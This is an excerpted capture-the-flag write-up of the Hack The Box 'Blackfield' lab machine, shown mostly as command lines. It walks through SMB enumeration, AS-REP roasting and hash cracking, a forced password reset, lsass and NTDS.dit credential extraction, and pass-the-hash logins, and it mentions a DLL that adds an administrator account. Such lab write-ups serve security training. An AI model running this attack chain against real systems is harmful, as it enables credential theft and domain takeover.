...
```bash
a3nk17@kali:~/htb/blackfield_demo$ sudo nmap -sC -sV -p- -T4 10.10.10.192
...
```bash
a3nk17@kali:~$ crackmapexec smb 10.10.10.192
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
```

![image-20200831190642974](/assets/img/posts/blackfield/image-20200831190642974.png)
...
```bash
a3nk17@kali:~$ smbmap -H 10.10.10.192
...
```bash
a3nk17@kali:~$ smbmap -u invalid -H 10.10.10.192
...
```bash
a3nk17@kali:~$ smbclient -U invalid //10.10.10.192/profiles\$
...
```bash
a3nk17@kali:~/htb/blackfield_demo$ smbclient -U invalid%invalid //10.10.10.192/profiles\$ -c ls | awk '{print $1}' > users.txt
...
```bash
a3nk17@kali:~/htb/blackfield_demo$ kerbrute userenum --dc 10.10.10.192 -d blackfield users.txt
...
```bash
a3nk17@kali:~/htb/blackfield_demo$ impacket-GetNPUsers blackfield/ -no-pass -dc-ip 10.10.10.192 -usersfile valid_users.txt 
...
```bash
a3nk17@kali:~/htb/blackfield_demo$ john -w=/usr/share/wordlists/rockyou.txt asrep.txt
...
```bash
a3nk17@kali:~/htb/blackfield_demo$ crackmapexec smb 10.10.10.192 -u support -p '#00^BlackKnight' --shares
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
...
```bash
a3nk17@kali:~/htb/blackfield_demo$ python3 ~/tools/BloodHound.py/bloodhound.py -c all -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192
...
![image-20200831195657024](/assets/img/posts/blackfield/image-20200831195657024.png)
...
![image-20200831195835373](/assets/img/posts/blackfield/image-20200831195835373.png)
...
![image-20200831200012084](/assets/img/posts/blackfield/image-20200831200012084.png)
...
```bash
a3nk17@kali:~/htb/blackfield_demo$ net rpc password audit2020 -U support -S 10.10.10.192
...
```bash
a3nk17@kali:~/htb/blackfield_demo$ crackmapexec smb 10.10.10.192 -u audit2020 -p Password123 --shares
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
...
After c`onnecting `to the `SMB` share we see a bunch of directories:

```bash
a3nk17@kali:~/htb/blackfield_demo$ smbclient -U audit2020%Password123 //10.10.10.192/forensic
Try "help" to get a list of possible commands.
smb: \> ls
...
```bash
a3nk17@kali:~/htb/blackfield_demo$ unzip lsass.zip 
Archive:  lsass.zip
  inflating: lsass.DMP
...
```bash
a3nk17@kali:~$ evil-winrm -u administrator -H 7f1e4ff8c6a8e6b6fcae2d9c0572cd62 -i 10.10.10.192
...
```bash
a3nk17@kali:~$ evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192
...
Using `diskshadow `we run the script and we end with a s`hadow drive Z`:
...
We also need the `SYSTEM` hive that contains the encryption key for the `NTDS.dit` file. The built-in download functionality in `vil-WinRM` is kinda slow so it takes a few minutes to download the file.
...
```bash
a3nk17@kali:~/htb/blackfield_demo$ impacket-secretsdump -ntds ntds.dit -system system local
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
...
```bash
a3nk17@kali:~/htb/blackfield_demo$ evil-winrm -H 184fb5e5178480be64824d4cd53b99ee -u administrator -i 10.10.10.192
...
We can use the following s`imple DLL` that creates a new user and adds it to the local `administrator's group`.
...
As I `understand` it, the file is `encrypted` with a c`ertificate` which is stored in the `Windows Certificate` store and only the `Administrator` user can access it. So if we change the `administrator password` and log in as administrator we'll still be able to read the file since the `cert` can be retrieved:
...
![info](/assets/img/posts/blackfield/pwn.png)
